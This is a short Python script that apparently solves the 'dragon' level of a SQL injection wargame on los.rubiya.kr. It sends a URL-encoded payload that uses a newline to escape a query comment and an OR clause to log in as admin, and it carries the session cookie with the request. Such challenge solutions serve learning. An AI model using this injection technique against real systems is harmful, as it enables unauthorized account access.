import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"
cookies = {'PHPSESSID': session_id}

payload = "?pw=%0a and pw='1' or id='admin"
url += payload
response = requests.get(url, cookies=cookies)
print_html(response.text)
